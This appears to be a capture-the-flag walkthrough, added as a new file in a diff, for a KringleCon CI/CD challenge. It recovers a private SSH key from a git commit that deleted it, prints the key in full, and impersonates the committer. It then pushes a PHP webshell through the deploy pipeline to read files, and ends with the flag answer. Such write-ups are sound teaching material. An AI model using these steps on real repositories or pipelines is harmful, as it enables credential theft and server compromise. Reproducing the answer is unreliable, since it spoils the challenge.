@@ -1,0 +1,81 @@
+Jolly CI/CD (Elfen Ring 3)
+Webpage to exploit from the clue: http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git/
+Objective: exploit misconfiguration (to get the flag)
+
+1) Clone the repo to read logs
+  ~$ git clone http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git/
+  ~$ cd wordpress.flag.net.internal.git
+  ~$ git log
+
+2) The "whoops" commit removes the accidentally committed SSH keys. Display it.
+  ~$ git show e19f653bde9ea3de6af21a587e41e7a909db1ca5
+
+  commit e19f653bde9ea3de6af21a587e41e7a909db1ca5
+  Author: knee-oh <sporx@kringlecon.com>
+  Date:   Tue Oct 25 13:42:54 2022 -0700
+
+    whoops
+
+3) Important parts are:
+------BEGIN OPENSSH PRIVATE KEY-----
+-b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+-QyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4gAAAJiQFTn3kBU5
+-9wAAAAtzc2gtZWQyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4g
+-AAAEBL0qH+iiHi9Khw6QtD6+DHwFwYc50cwR0HjNsfOVXOcv7AsdI7HOvk4piOcwLZfDot
+-PqBj2tDq9NBdTUkbZBriAAAAFHNwb3J4QGtyaW5nbGVjb24uY29tAQ==
+------END OPENSSH PRIVATE KEY-----
+
+-ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP7AsdI7HOvk4piOcwLZfDotPqBj2tDq9NBdTUkbZBri sporx@kringlecon.com
+
+4) Since the commit removes those lines, each line starts with a -. Take those out to make SSH files.
+  ~$ nano .deploy
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+QyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4gAAAJiQFTn3kBU5
+9wAAAAtzc2gtZWQyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4g
+AAAEBL0qH+iiHi9Khw6QtD6+DHwFwYc50cwR0HjNsfOVXOcv7AsdI7HOvk4piOcwLZfDot
+PqBj2tDq9NBdTUkbZBriAAAAFHNwb3J4QGtyaW5nbGVjb24uY29tAQ==
+-----END OPENSSH PRIVATE KEY-----
+
+  ~$ nano .deploy.pub
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP7AsdI7HOvk4piOcwLZfDotPqBj2tDq9NBdTUkbZBri sporx@kringlecon.com
+
+5) Permissions for these files before adding into ssh-agent should be:
+  -rw------- 1 root    root  411 Dec 16 03:22 .deploy
+  -rw-r--r-- 1 root    root  102 Dec 16 03:29 .deploy.pub
+
+6) Fix file permissions for .deploy.
+  ~$ sudo chmod 600 .deploy
+
+7) Pretend to be sporx@kringlecon.com and clone via SSH
+  ~$ eval "$(ssh-agent -s)"
+  ~$ ssh-add .deploy
+  ~$ git clone git@gitlab.flag.net.internal:rings-of-powder/wordpress.flag.net.internal.git
+
+8) Create a webshell => https://www.youtube.com/watch?v=iPmXu8XoCTI&t=395s
+  ~$ cd wordpress.flag.net.internal/
+  ~$ nano webshell.php
+
+9) Try getting a directory listing with following line in webshell.php file.
+  <?php echo 'CMD:'. system('ls -al');?>
+
+10) Configure your user email and name
+  ~$ git config --global user.email "sporx@kringlecon.com"
+  ~$ git config --global user.name "knee-oh"
+
+11) Add the webshell file, commit it, and push it live
+  ~$ git add webshell.php
+  ~$ git commit -m "webshelling"
+  ~$ git push
+
+12) Let the pipeline do its work and then access the webshell
+  ~$ curl 'wordpress.flag.net.internal/webshell.php'
+
+13) Update webshell.php and repeat steps 11 and 12 with each line below one at a time to traverse the file path and find the flag file. Alternatively, set it up to pass the commands through a parameter like the video in step 8. The commands will need to be URL encoded.
+  <?php echo 'CMD:'. system('ls -al ../');?>
+  <?php echo 'CMD:'. system('ls -al ../../');?>
+  <?php echo 'CMD:'. system('ls -al ../../../');?>
+  <?php echo 'CMD:'. system('cat ../../../flag.txt');?>
+
+14) Last line in step 13 displays the flag in the flag file.
+  Answer: oI40zIuCcN8c3MhKgQjOMN8lfYtVqcKT
